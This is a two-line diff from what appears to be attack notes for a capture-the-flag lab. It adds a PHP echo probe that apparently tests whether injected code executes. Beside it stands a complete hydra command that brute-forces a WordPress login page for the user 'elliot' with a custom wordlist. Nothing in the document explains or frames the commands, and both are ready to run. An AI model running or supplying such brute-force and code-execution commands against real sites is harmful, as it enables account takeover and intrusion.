@@ -1,1 +1,3 @@
+<?php echo "TEST_OK"; ?>
+
 hydra -l elliot -P fsocity_clean.dic -t 30 -V 192.168.1.1 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=login_error"
